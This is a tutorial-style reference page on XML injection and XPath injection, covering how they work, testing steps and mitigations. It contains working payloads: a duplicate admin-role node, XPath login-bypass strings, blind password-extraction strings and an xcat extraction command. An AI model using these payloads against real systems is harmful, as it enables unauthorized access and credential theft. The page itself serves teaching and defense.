# What is XML Injection?

XML Injection happens when user input is written into an XML document or message without encoding, letting an attacker change the document's structure. Depending on how the XML is used, this can mean tampering with data, bypassing logic, or opening the door to XXE and XPath injection. It is common in SOAP services, config files, and any API that builds XML from strings.

## How it works

- The app inserts raw input between XML tags or into attributes
- Injecting `<`, `>`, or `"` lets you close tags early and add new nodes
- New nodes can overwrite trusted values (for example, a role or price field)

## XML Injection vs XXE vs XPath injection

- **XML Injection** - break the document structure (add/overwrite nodes).
- **XXE** - abuse external entities to read files/SSRF (see the XXE topic).
- **XPath injection** - tamper with an XPath query that runs over the XML (SQLi-style).

## Structure tampering payloads

```xml
<!-- Probe: does the parser choke on a stray tag? -->
test</username><username>injected

<!-- Privilege escalation: inject a later, duplicate node that "wins" -->
<user>
  <name>attacker</name>
  <role>user</role><role>admin</role>
</user>

<!-- CDATA to smuggle characters past naive filters -->
<![CDATA[<script>alert(1)</script>]]>

<!-- Comment out the rest of a document -->
<name>attacker</name><!--
```

## XPath injection (auth bypass)

If a login runs `//user[username/text()='USER' and password/text()='PASS']`:

```text
Username: ' or '1'='1
Password: ' or '1'='1

# The query becomes always-true -> logs in as the first user
```

Blind XPath - extract data char by char:

```text
' or string-length(//user[1]/password)=8 or 'a'='b     (guess length)
' or substring(//user[1]/password,1,1)='s' or 'a'='b   (guess char 1)
```

## Tools

- [Burp Suite](https://portswigger.net/burp) - Repeater to reshape XML by hand
- [xcat](https://github.com/orf/xcat) - automated (blind) XPath injection exploitation
- [SoapUI](https://www.soapui.org/) - craft and replay SOAP requests

```bash
# Automated blind XPath extraction with xcat
xcat run "https://target.tld/search" query "test" --true-string "found"
```

## Manual testing

1. Submit `<`, `>`, `"`, `'` and see whether the XML still parses (or errors).
2. Try to close an existing element and open a new one.
3. Inject a duplicate node for a security field (role, amount) - which wins?
4. If the XML feeds an XPath query, test the auth-bypass and blind strings above.

## Mitigation - the fix

- Build XML with a **library/DOM API**, never string concatenation.
- **Encode** user data for XML context (`&lt; &gt; &amp; &quot; &apos;`).
- For XPath, use **parameterised** queries (variable references), not string building.
- Validate against a strict **XSD schema**; reject unexpected nodes.
- Disable DTD processing to stop XXE riding along.

## Practice

- OWASP WebGoat XPath injection lesson

## Deep dive

- [XML Injection - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [OWASP XML Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html)

## CWE

- CWE-91: XML Injection (aka Blind XPath Injection)
